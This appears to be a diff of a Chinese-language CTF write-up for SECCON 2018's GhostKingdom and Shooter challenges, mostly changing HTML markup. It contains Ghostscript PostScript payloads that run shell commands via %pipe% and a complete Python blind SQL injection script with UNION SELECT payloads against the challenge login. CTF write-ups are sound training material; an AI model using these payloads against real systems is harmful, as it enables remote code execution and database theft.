-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231135-c2715598-dac3-1.png" data-sizes="auto" alt="Upload" title="Upload" class="lazyload"><figcaption class="image-caption">Upload</figcaption></figure></p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231146-c95adc76-dac3-1.png" data-sizes="auto" alt="Upload2" title="Upload2" class="lazyload"><figcaption class="image-caption">Upload2</figcaption></figure></p>
-
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231135-c2715598-dac3-1.png" alt="Upload" title="Upload"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181028231146-c95adc76-dac3-1.png" alt="Upload2" title="Upload2"></p>
 <p>然后尝试触发 <strong>Convert to GIF format</strong>，得到报错：</p>
-
 <pre><code>convert: Not a JPEG file: starts with 0x62 0x6f `/var/www/html/images/05b12f2ee7ee7192e645c705fe50d1dc.jpg' @ error/jpeg.c/JPEGErrorHandler/316. convert: no images defined `/var/www/html/images/05b12f2ee7ee7192e645c705fe50d1dc.gif' @ error/convert.c/ConvertImageCommand/3046. 
 /images/05b12f2ee7ee7192e645c705fe50d1dc.gif
-</code></pre>
-
-<p>根据报错搜索可以得到相应程序使用的库：imagemagick，然后继续搜索 imagemagick 相关的漏洞，得到 <a href="https://www.secrss.com/articles/4753" rel="nofollow noreferrer" target="_blank">Ghostscript命令执行漏洞</a>，结合题目标题 ghostkingdom，很明显地提示了相应考点：ghostscript 的命令执行。</p>
-
+</code></pre><p>根据报错搜索可以得到相应程序使用的库：imagemagick，然后继续搜索 imagemagick 相关的漏洞，得到 <a href="https://www.secrss.com/articles/4753">Ghostscript命令执行漏洞</a>，结合题目标题 ghostkingdom，很明显地提示了相应考点：ghostscript 的命令执行。</p>
 <p>于是从网上借鉴一个 POC:</p>
-
-<pre><code class="language-ghostscript">%!PS
+<pre><code class="language-ghostscript" data-lang="ghostscript">%!PS
 userdict /setpagedevice undef
 legal
 { null restore } stopped { pop } if
 legal
 mark /OutputFile (%pipe%$(ls /var/www/html/FLAG/)) currentdevice putdeviceprops
-</code></pre>
-
-<p>列出目录后得到 flag 文件名为 <code>FLAGflagF1A8.txt</code>，继续构造，获得 flag</p>
-
-<pre><code class="language-ghostscript">%!PS
+</code></pre><p>列出目录后得到 flag 文件名为 <code>FLAGflagF1A8.txt</code>，继续构造，获得 flag</p>
+<pre><code class="language-ghostscript" data-lang="ghostscript">%!PS
 userdict /setpagedevice undef
 legal
 { null restore } stopped { pop } if
 legal
 mark /OutputFile (%pipe%$(cat /var/www/html/FLAG/FLAGflagF1A8.txt)) currentdevice putdeviceprops
-</code></pre>
-
-<h2 id="总结">总结</h2>
-
+</code></pre><h2 id="总结">总结</h2>
 <p>本题结合了 XSS / SSRF / GhostScript 命令执行漏洞，环环相扣，可以说是非常有趣了。另外听说貌似还有道表面 Reverse 题，考的是 SQL 注入，有空做了继续贴在这里。。</p>
-
 <h2 id="shooter">Shooter</h2>
-
 <p>当初以为这道题既然只挂了 RE，肯定还是道 Reverse 题目，没想到后半部分还真的是道 Web，坑队友了…当时说账户密码是不是还藏在 apk 文件里什么的…</p>
-
-<p>前面 Re 的部分不再赘述（毕竟不会），我们来看后半部分的 SQL 注入部分。首先是关注到这样一个链接：<a href="http://staging.shooter.pwn.seccon.jp/admin/sessions/new" rel="nofollow noreferrer" target="_blank">http://staging.shooter.pwn.seccon.jp/admin/sessions/new</a> ，是个登录界面：</p>
-
-<p><figure><img src="/images/ring.svg" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181031131750-4ff44cd6-dccc-1.png" data-sizes="auto" alt="Inject" title="Inject" class="lazyload"><figcaption class="image-caption">Inject</figcaption></figure></p>
-
+<p>前面 Re 的部分不再赘述（毕竟不会），我们来看后半部分的 SQL 注入部分。首先是关注到这样一个链接：http://staging.shooter.pwn.seccon.jp/admin/sessions/new ，是个登录界面：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181031131750-4ff44cd6-dccc-1.png" alt="Inject" title="Inject"></p>
 <p>由于是复现的就只关注写脚本了，哪位大佬能告诉我是怎么 fuzz 出注入点的，完全不会（哭泣</p>
-
 <p>总之在 password 使用 <code>'))) union select 1#</code> 可以登录成功，但很明显的由于没有回显，所以只能尝试盲注。可以注意到 <code>'))) union select 1#</code> 和 <code>'))) union select NULL#</code> 是两种不同的结果，前者显示登录成功，后者则是回到该页面继续登录，所以可以根据这一特点进行盲注，盲注脚本如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
 
-<pre><code class="language-python">import string
-import requests
-from bs4 import BeautifulSoup
+s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
 
-s = requests.Session()
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">judge</span>(text):
+    <span style="color:#66d9ef">return</span> len(text) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1772</span>
 
-def judge(text):
-    return len(text) &lt; 1772
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(url):
+    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>get(url)
 
-def get(url):
-    return s.get(url)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(url, data):
+    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data)
 
-def post(url, data):
-    return s.post(url, data=data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(payload):
+    text <span style="color:#f92672">=</span> get(<span style="color:#e6db74">&#39;http://staging.shooter.pwn.seccon.jp/admin/sessions/new&#39;</span>)<span style="color:#f92672">.</span>text
+    html <span style="color:#f92672">=</span> BeautifulSoup(text, <span style="color:#e6db74">&#39;lxml&#39;</span>)
+    inputs <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;input&#39;</span>)
+    csrf_token <span style="color:#f92672">=</span> inputs[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#39;value&#39;</span>]
 
-def test(payload):
-    text = get('http://staging.shooter.pwn.seccon.jp/admin/sessions/new').text
-    html = BeautifulSoup(text, 'lxml')
-    inputs = html.find_all('input')
-    csrf_token = inputs[1]['value']
-
-    data = {
-        'authenticity_token': csrf_token,
-        'login_id': 'admin',
-        'password': payload,
-        'commit': 'Login'
+    data <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;authenticity_token&#39;</span>: csrf_token,
+        <span style="color:#e6db74">&#39;login_id&#39;</span>: <span style="color:#e6db74">&#39;admin&#39;</span>,
+        <span style="color:#e6db74">&#39;password&#39;</span>: payload,
+        <span style="color:#e6db74">&#39;commit&#39;</span>: <span style="color:#e6db74">&#39;Login&#39;</span>
     }
 
-    return post('http://staging.shooter.pwn.seccon.jp/admin/sessions', data)
+    <span style="color:#66d9ef">return</span> post(<span style="color:#e6db74">&#39;http://staging.shooter.pwn.seccon.jp/admin/sessions&#39;</span>, data)
 
-def blind_inject(s):
-    r = ''
-    while True:
-        left = 0
-        right = 128
-        while left &lt;= right:
-            mid = (left + right) // 2
-            c = chr(mid)
-            if c == &quot;'&quot; or c == &quot;#&quot;:
-                mid += 1
-                c = chr(mid)
-            payload = s.format(len(r)+1, c)
-            if judge(test(payload).text):
-                left = mid + 1
-            else:
-                right = mid - 1
-        if left == 0 or left == 32:
-            break
-        else:
-            print(left)
-        r += chr(left)
-        print(r)
-    return r
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">blind_inject</span>(s):
+    r <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">while</span> True:
+        left <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        right <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
+        <span style="color:#66d9ef">while</span> left <span style="color:#f92672">&lt;=</span> right:
+            mid <span style="color:#f92672">=</span> (left <span style="color:#f92672">+</span> right) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+            c <span style="color:#f92672">=</span> chr(mid)
+            <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#39;&#34;</span> <span style="color:#f92672">or</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;#&#34;</span>:
+                mid <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+                c <span style="color:#f92672">=</span> chr(mid)
+            payload <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>format(len(r)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, c)
+            <span style="color:#66d9ef">if</span> judge(test(payload)<span style="color:#f92672">.</span>text):
+                left <span style="color:#f92672">=</span> mid <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+            <span style="color:#66d9ef">else</span>:
+                right <span style="color:#f92672">=</span> mid <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">if</span> left <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> left <span style="color:#f92672">==</span> <span style="color:#ae81ff">32</span>:
+            <span style="color:#66d9ef">break</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">print</span>(left)
+        r <span style="color:#f92672">+=</span> chr(left)
+        <span style="color:#66d9ef">print</span>(r)
+    <span style="color:#66d9ef">return</span> r
 
-def main():
-    # database: SHOOTER_STAGING
-    # blind_inject(&quot;'))) union SELECT if(SUBSTR(database(),{},1) &gt; '{}', 1, NULL)#&quot;)
-    #
-    # table: AR_INTERNAL_METADATA,FLAGS ...
-    # blind_inject(&quot;'))) union SELECT if(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{},1) &gt; '{}', 1, NULL)#&quot;)
-    #
-    # column: ID,VALUE,CREATED_AT,UPDATED_AT
-    # blind_inject(&quot;'))) union SELECT if(substr((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'flags'), {},1) &gt; '{}', 1, NULL)#&quot;)
-    #
-    # flag
-    blind_inject(&quot;'))) union SELECT if(substr((SELECT value FROM flags where id = 1), {},1) &gt; '{}', 1, NULL)#&quot;)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#75715e"># database: SHOOTER_STAGING</span>
+    <span style="color:#75715e"># blind_inject(&#34;&#39;))) union SELECT if(SUBSTR(database(),{},1) &gt; &#39;{}&#39;, 1, NULL)#&#34;)</span>
+    <span style="color:#75715e">#</span>
+    <span style="color:#75715e"># table: AR_INTERNAL_METADATA,FLAGS ...</span>
+    <span style="color:#75715e"># blind_inject(&#34;&#39;))) union SELECT if(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{},1) &gt; &#39;{}&#39;, 1, NULL)#&#34;)</span>
+    <span style="color:#75715e">#</span>
+    <span style="color:#75715e"># column: ID,VALUE,CREATED_AT,UPDATED_AT</span>
+    <span style="color:#75715e"># blind_inject(&#34;&#39;))) union SELECT if(substr((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#39;flags&#39;), {},1) &gt; &#39;{}&#39;, 1, NULL)#&#34;)</span>
+    <span style="color:#75715e">#</span>
+    <span style="color:#75715e"># flag</span>
+    blind_inject(<span style="color:#e6db74">&#34;&#39;))) union SELECT if(substr((SELECT value FROM flags where id = 1), {},1) &gt; &#39;{}&#39;, 1, NULL)#&#34;</span>)
 
-if __name__ == '__main__':
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     main()
-</code></pre>
-
-<p>最后获得 flag：SECCON{1NV4L1D_4DM1N_P4G3_4U+H3NT1C4T10N}</p>
-
+</code></pre></div><p>最后获得 flag：SECCON{1NV4L1D_4DM1N_P4G3_4U+H3NT1C4T10N}</p>
 <h2 id="参考文章">参考文章</h2>
-
 <ul>
-<li><a href="https://bbs.ichunqiu.com/thread-44747-1-1.html" rel="nofollow noreferrer" target="_blank">ghostscript命令执行复现POC</a></li>
-<li><a href="https://www.anquanke.com/post/id/157513" rel="nofollow noreferrer" target="_blank">https://www.anquanke.com/post/id/157513</a></li>
-<li><a href="http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="nofollow noreferrer" target="_blank">GhostScript命令执行漏洞</a></li>
-<li><a href="https://graneed.hatenablog.com/entry/2018/10/28/150722" rel="nofollow noreferrer" target="_blank">GhostKingdom writeup by noraneco</a></li>
-<li><a href="https://github.com/PDKT-Team/ctf/tree/master/seccon2018/shooter" rel="nofollow noreferrer" target="_blank">shooter writeup by PDKT</a></li>
+<li><a href="https://bbs.ichunqiu.com/thread-44747-1-1.html">ghostscript命令执行复现POC</a></li>
+<li><a href="https://www.anquanke.com/post/id/157513">https://www.anquanke.com/post/id/157513</a></li>
+<li><a href="http://uuzdaisuki.com/2018/08/22/GhostScript%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">GhostScript命令执行漏洞</a></li>
+<li><a href="https://graneed.hatenablog.com/entry/2018/10/28/150722">GhostKingdom writeup by noraneco</a></li>
+<li><a href="https://github.com/PDKT-Team/ctf/tree/master/seccon2018/shooter">shooter writeup by PDKT</a></li>
 </ul>
 
     </div>
